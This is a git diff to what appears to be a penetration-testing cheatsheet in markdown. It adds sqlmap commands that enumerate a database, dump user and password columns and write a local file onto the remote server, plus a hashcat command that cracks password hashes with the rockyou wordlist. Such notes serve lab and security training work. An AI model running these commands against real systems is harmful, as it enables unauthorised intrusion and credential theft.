@@ -59,7 +59,7 @@ Invoke-Command -Session $session -Script {whoami}
 ##### smbmap with creds
 * `smbmap.py -u 'user' -p 'password' -H ip`
 
-## [↑](#table-of-contents)Windows Cheatsheet
+## [↑](#table-of-contents)Linux Cheatsheet
 ### Enumeration
 #### Basic Info Scan
 * `nmap -sV -sC -o machine.nmap IP`
@@ -69,6 +69,14 @@ Invoke-Command -Session $session -Script {whoami}
 
 #### Sqlmap Usage
 * `sqlmap -u url --headers="header" --data="idProduct=1"`
+* `sqlmap -u url --headers="header" --data="idProduct=1"` --dbs
+* `sqlmap -u url --headers="header" --data="idProduct=1"` -D database --tables
+* `sqlmap -u url --headers="header" --data="idProduct=1"` -D database -T table --columns
+* `sqlmap -u url --headers="header" --data="idProduct=1"` -D database -T table -C user,password --dump
+* `sqlmap -u url --headers="header" --data="idProduct=1"` -D database --file-dest="remote" --file-write="local"
+
+#### Password Cracking
+* `hashcat --force -m 1800 -a 0 -o found1.txt creds /usr/share/wordlists/rockyou.txt`
 
 <br/>
 <br/>
